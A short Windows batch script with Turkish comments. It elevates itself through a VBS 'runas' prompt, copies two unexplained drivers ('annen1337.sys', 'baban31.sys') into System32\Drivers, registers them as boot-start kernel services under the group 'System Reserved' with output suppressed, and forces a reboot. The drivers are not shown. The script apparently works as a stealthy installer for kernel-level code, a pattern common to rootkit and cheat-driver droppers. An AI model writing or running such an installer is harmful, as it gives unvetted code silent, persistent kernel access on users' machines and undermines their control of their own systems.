@echo off
setlocal

:: Yönetici izni kontrolü ve komut dosyasının yönetici olarak çalıştırılması
openfiles >nul 2>&1 || (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)

set "system32Dir=C:\Windows\System32\Drivers"
if exist "%~dp0annen1337.sys" (
    copy /y "%~dp0annen1337.sys" "%system32Dir%"
)

set "system32Dir=C:\Windows\System32\Drivers"
if exist "%~dp0baban31.sys" (
    copy /y "%~dp0baban31.sys" "%system32Dir%"
)


C:\Windows\system32\cmd.exe /c sc create annen1337 binPath= "C:\Windows\System32\Drivers\annen1337.sys" DisplayName= "annen1337" start= boot tag= 2 type= kernel group="System Reserved" >nul 2>&1
C:\Windows\system32\cmd.exe /c sc create baban31 binPath= "C:\Windows\System32\Drivers\baban31.sys" DisplayName= "baban31" start= boot tag= 2 type= kernel group="System Reserved" >nul 2>&1


:: Bilgisayarı yeniden başlat
C:\Windows\system32\cmd.exe /c shutdown /r /t 5



exit
